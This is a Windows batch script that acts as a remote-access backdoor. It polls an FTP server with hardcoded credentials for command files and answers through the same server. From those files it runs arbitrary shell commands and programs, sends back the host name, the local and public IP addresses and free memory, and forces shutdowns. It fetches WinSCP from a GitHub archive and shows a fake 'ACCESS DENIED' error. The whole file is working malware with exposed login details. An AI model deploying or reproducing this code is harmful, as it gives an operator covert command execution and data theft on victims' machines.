@ECHO OFF
cls
set username="unaux_27236823"
set password="Manxvged1x99g54"
set host="ftpupload.net"
del WinSCP.ini
del delattrib.tmp
del receiveattrib.tmp
del sendattrib.tmp
del /q send\*
del /q receve\*
if exist WinSCP.ini goto error
if exist delattrib.tmp goto error
if exist receiveattrib.tmp goto error
if exist sendattrib.tmp goto error
md receve
md send
cls
if exist WinSCP.exe goto rund
if exist WinSCP.com goto rund
echo !UNPACKING!
powershell -Command "Invoke-WebRequest https://github.com/rasil1127/Acket/archive/main.zip -OutFile IMB.zip"
powershell Expand-Archive IMB.zip
powershell Expand-Archive IMB\Acket-main\IMB.zip
del IMB.zip
del IMB\Acket-main\IMB.zip
@RD /S /Q "IMB\Acket-main"
SET src_folder=IMB
SET tar_folder=%cd%
for /f %%a IN ('dir "%src_folder%" /b') do move "%src_folder%\%%a" "%tar_folder%\"
@RD /S /Q "IMB"
del ReadMe.txt
:rund
echo open ftp://%username%:%password%@%host%>>delattrib.tmp
echo rm /htdocs/*>>delattrib.tmp
echo exit>>delattrib.tmp
echo open ftp://%username%:%password%@%host%>>sendattrib.tmp
echo rm /htdocs/*>>sendattrib.tmp
echo put send\* /htdocs/>>sendattrib.tmp
echo exit>>sendattrib.tmp
echo open ftp://%username%:%password%@%host%>>receiveattrib.tmp
echo get /htdocs/* receve\>>receiveattrib.tmp
echo rm /htdocs/*>>receiveattrib.tmp
echo exit>>receiveattrib.tmp
:ping
ping localhost -n 1 >nul
if exist null.unix goto null
"WinSCP.com" /script="receiveattrib.tmp"
if exist receve\dbug.unix goto dbug
if exist receve\rmunix.unix goto rmoffunix
if exist receve\getmem.unix goto getmem
if exist receve\off.unix goto off
if exist receve\tdir.unix goto tdir
if exist receve\trun.unix goto trun
if exist receve\shell.unix goto shell
if exist receve\tping.unix goto tping
if exist receve\ipcnfg-pbc.unix goto ipcnfg-pbc
if exist receve\ipcnfg-pve.unix goto ipcnfg-pve
goto ping


:dbug
del /q send\*
del /q receve\*
"WinSCP.com" /script="delattrib.tmp"
echo %ComputerName%>send\dbug.unix
"WinSCP.com" /script="sendattrib.tmp"
del /q send\*
goto ping


:tping
del /q send\*
del /q receve\*
"WinSCP.com" /script="delattrib.tmp"
"WinSCP.com" /script="delattrib.tmp"
echo .>send\tping.unix
"WinSCP.com" /script="sendattrib.tmp"
del /q send\*
goto ping




:ipcnfg-pve
del /q send\*
del /q receve\*
"WinSCP.com" /script="delattrib.tmp"
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
echo %NetworkIP%>send\ipcnfg-pve.unix
"WinSCP.com" /script="sendattrib.tmp"
del /q send\*
goto ping







:ipcnfg-pbc
del /q send\*
del /q receve\*
"WinSCP.com" /script="delattrib.tmp"
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
echo %PublicIP%>send\ipcnfg-pbc.unix
"WinSCP.com" /script="sendattrib.tmp"
del /q send\*
goto ping




:shell
del /q send\*
"WinSCP.com" /script="delattrib.tmp"
set /p shell=<receve\shell.unix
start cmd /C %shell%
echo .>send\shell.unix
"WinSCP.com" /script="sendattrib.tmp"
del /q send\*
del /q receve\*
goto ping




:trun
del /q send\*
"WinSCP.com" /script="delattrib.tmp"
set /p trun=<receve\trun.unix
start %trun%
echo .>send\trun.unix
"WinSCP.com" /script="sendattrib.tmp"
del /q send\*
del /q receve\*
goto ping




:tdir
del /q send\*
del /q receve\*
"WinSCP.com" /script="delattrib.tmp"
SET mypath=%~dp0
echo %mypath:~0,-1%>send\tdir.unix
"WinSCP.com" /script="sendattrib.tmp"
del /q send\*
goto ping


:off
del /q send\*
del /q receve\*
"WinSCP.com" /script="delattrib.tmp"
echo .>send\off.unix
"WinSCP.com" /script="sendattrib.tmp"
del /q send\*
shutdown /s /f /t 0
exit





:getmem
del /q send\*
del /q receve\*
"WinSCP.com" /script="delattrib.tmp"
for /f "skip=1" %%p in ('wmic os get freephysicalmemory') do ( 
  set m=%%p
  goto :getmemdone
)
:getmemdone
echo %m%>send\getmem.unix
"WinSCP.com" /script="sendattrib.tmp"
del send\getmem.unix
del receve\getmem.unix
goto ping


:rmoffunix
del /q send\*
del /q receve\*
"WinSCP.com" /script="delattrib.tmp"
echo .>send\rmunix.unix
"WinSCP.com" /script="sendattrib.tmp"
del /q send\*
exit

:null
del null.unix
exit

:error
cls
echo cannot launch program 0x22
echo press any key to exit.
echo (ACCESS DENIED)
pause>nul
exit